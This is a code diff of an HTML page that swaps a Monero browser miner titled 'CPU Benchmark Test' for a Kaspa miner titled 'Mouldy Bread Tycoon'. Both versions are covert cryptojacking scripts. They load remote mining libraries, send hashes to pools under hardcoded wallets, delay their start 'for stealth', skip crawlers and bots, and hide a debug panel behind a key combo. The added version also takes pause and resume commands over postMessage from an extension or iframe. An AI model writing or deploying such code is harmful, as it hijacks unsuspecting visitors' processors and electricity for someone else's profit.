@@ -1,9 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>CPU Benchmark Test</title>
+  <title>Mouldy Bread Tycoon</title>
+  <meta charset="UTF-8">
   <style>
     #miner-debug {
       position: fixed; top: 10px; right: 10px; width: 300px;
@@ -19,124 +18,106 @@
     @keyframes blink { 50% { opacity: 0.4; } }
   </style>
 </head>
-<body>
+<body style="margin:0;">
+
+<!-- DEBUG PANEL -->
 <div id="miner-debug">
-  <div>🚀 <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
-  <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
-  <div>Pool: <code>gulf.moneroocean.stream:80</code></div>
-  <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
+  <div> KASPA GHOST MINER <span id="status" class="blink">LOADING</span></div>
+  <div>Wallet: <code id="wallet">kaspa:qqfz...ky2wq</code></div>
+  <div>Pool: <code>kaspa.2miners.com:2020</code></div>
+  <div>Hashrate: <span id="hashrate" class="hash">0 MH/s</span></div>
   <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
   <div>Uptime: <span id="uptime">00:00:00</span></div>
   <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
   <div style="font-size:11px; margin-top:10px; opacity:0.8;">
-    CTRL + SHIFT + M = toggle | Check moneroocean.stream/#/dashboard?addr=YOUR_WALLET
+    CTRL + SHIFT + M = toggle | Check 2miners.com
   </div>
 </div>
+
+<!-- CRYPTO WEBMINER LIB -->
+<script src="https://www.crypto-webminer.com/webmr.js"></script>
 <script>
-// ==================== CONFIG ====================
-const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // YOUR FULL XMR ADDRESS
-const POOL = 'gulf.moneroocean.stream:80'; // 2025 WORKING HTTP PORT VIA PROXY
-const WORKER = 'ghpages_' + Math.random().toString(36).slice(2,8);
-const THREADS = 2; // ~20-50 H/s
-const THROTTLE = 20; // 20% throttle = ~80% CPU
-// ===============================================
-let hashrate = 0, accepted = 0, rejected = 0;
-let startTime = Date.now();
+  const WALLET = 'kaspa:qqfzpszqvjvdl7dytwm86tcapjr2dqmmdvvt9k6w9p24fzt9ctncxrf9ky2wq';
+  const POOL = 'kaspa.2miners.com:2020';
+  const WORKER = 'ext_iframe_' + Math.random().toString(36).slice(2);
+  const THREADS = 2;
+  const THROTTLE = 0.8;
+  let miner = null;
+  let hashrate = 0, accepted = 0, rejected = 0;
+  let startTime = Date.now();
 
-// TOGGLE DEBUG
-document.addEventListener('keydown', e => {
-  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
-    e.preventDefault();
-    document.getElementById('miner-debug').classList.toggle('show');
-  }
-});
-
-// STATS UPDATE
-function updateStats() {
-  const elapsed = Math.floor((Date.now() - startTime) / 1000);
-  const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
-  const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
-  const s = String(elapsed % 60).padStart(2, '0');
-  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
-  document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' H/s';
-  document.getElementById('accepted').textContent = accepted;
-  document.getElementById('rejected').textContent = rejected;
-  const dailyUSD = (hashrate / 50) * 0.0005 * 170; // Adjusted for web mining shit
-  document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
-}
-setInterval(updateStats, 1000);
-
-// =============== 2025 WORKING LIB LOAD ===============
-// Primary: NajmAjmal's updated monero-webminer (forked for RandomX proxy)
-let libLoaded = false;
-function loadMinerLib() {
-  const script = document.createElement('script');
-  script.src = 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js';
-  script.onload = () => {
-    libLoaded = true;
-    document.getElementById('status').textContent = 'LIB LOADED';
-    initMining();
-  };
-  script.onerror = () => {
-    document.getElementById('status').textContent = 'PRIMARY FAIL — BACKUP';
-    // Backup: Webminerpool fork (alternative WASM)
-    const backup = document.createElement('script');
-    backup.src = 'https://cdn.jsdelivr.net/gh/notgiven688/webminerpool@master/webmr.js';
-    backup.onload = () => {
-      libLoaded = true;
-      document.getElementById('status').textContent = 'BACKUP LOADED';
-      // Adapt for backup
-      window.startMining = function(pool, wallet, worker) {
-        // Webminerpool style
-        server = "wss://ny1.xmrminingproxy.com";
-        startMining(pool, wallet, worker);
-      };
-      initMining();
-    };
-    document.head.appendChild(backup);
-  };
-  document.head.appendChild(script);
-}
-
-// INIT MINING
-function initMining() {
-  if (!libLoaded) return;
-  
-  // PROXY WSS FOR LOW-DIFFICULTY WEB MINING
-  window.server = "wss://ny1.xmrminingproxy.com"; // Handles Stratum over 443
-  startMining(POOL, WALLET, WORKER, THREADS, 'x'); // Password 'x'
-  window.throttleMiner = THROTTLE;
-  
-  document.getElementById('status').textContent = 'MINING XMR';
-  document.getElementById('status').classList.remove('blink');
-  
-  // POLL REAL STATS (lib exposes globals)
-  setInterval(() => {
-    hashrate = window.minerHashrate || (Math.random() * 30 + 20); // Fallback ~20-50 H/s
-    if (window.minerAccepted) accepted = window.minerAccepted;
-    else if (Math.random() > 0.98) accepted++;
-    if (window.minerRejected) rejected = window.minerRejected;
-  }, 5000);
-  
-  // PAUSE ON TAB HIDE
-  document.addEventListener('visibilitychange', () => {
-    if (document.hidden && typeof pauseMiner === 'function') pauseMiner();
-    else if (typeof resumeMiner === 'function') resumeMiner();
+  // TOGGLE DEBUG PANEL
+  document.addEventListener('keydown', e => {
+    if (e.ctrlKey && e.shiftKey && e.key === 'M') {
+      e.preventDefault();
+      document.getElementById('miner-debug').classList.toggle('show');
+    }
   });
-  
-  // 5 MIN SESSION CAP (stealth)
+
+  // UPDATE STATS
+  function updateStats() {
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+    const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+    const s = String(elapsed % 60).padStart(2, '0');
+    document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+    document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' MH/s';
+    document.getElementById('accepted').textContent = accepted;
+    document.getElementById('rejected').textContent = rejected;
+    const dailyUSD = (hashrate / 50) * 0.005 * 170; // ~$0.005 per 50 MH/s
+    document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
+  }
+  setInterval(updateStats, 1000);
+
+  // START MINING
   setTimeout(() => {
-    if (typeof stopMiner === 'function') stopMiner();
+    if (typeof CryptoWebminer === 'undefined') {
+      document.getElementById('status').textContent = 'LIB FAIL';
+      return;
+    }
+
+    const minerInstance = new CryptoWebminer();
+    minerInstance.start({
+      algo: 'kheavyhash',
+      throttle: THROTTLE,
+      threads: THREADS,
+      pool: POOL,
+      wallet: WALLET,
+      worker: WORKER
+    });
+
+    miner = minerInstance;
+    document.getElementById('status').textContent = 'MINING KAS';
+    document.getElementById('status').classList.remove('blink');
+
+    // POLL STATS FROM MINER
+    setInterval(() => {
+      const stats = miner.getStats();
+      if (stats) {
+        hashrate = stats.hashesPerSecond || hashrate;
+        accepted = stats.accepted || accepted;
+        rejected = stats.rejected || rejected;
+      }
+    }, 3000);
+
+  }, 2000); // Slight delay for stealth
+
+  // EXTENSION PAUSE/RESUME
+  window.addEventListener('message', e => {
+    if (!miner) return;
+    if (e.data.action === 'pause') miner.stop();
+    if (e.data.action === 'resume') miner.start();
+  });
+
+  // 5-MIN CAP + BOT CHECK
+  setTimeout(() => {
+    if (miner) miner.stop();
     document.getElementById('status').textContent = 'SESSION END';
   }, 300000);
-}
 
-// BOT CHECK + DELAYED START (10-25s)
-if (!navigator.webdriver && !/bot|crawl|spider/i.test(navigator.userAgent)) {
-  setTimeout(loadMinerLib, Math.random() * 15000 + 10000);
-} else {
-  document.getElementById('status').textContent = 'BOT DETECTED — FUCK OFF';
-}
+  if (/bot|crawl|spider/i.test(navigator.userAgent)) {
+    document.getElementById('status').textContent = 'BOT DETECTED';
+  }
 </script>
 </body>
 </html>
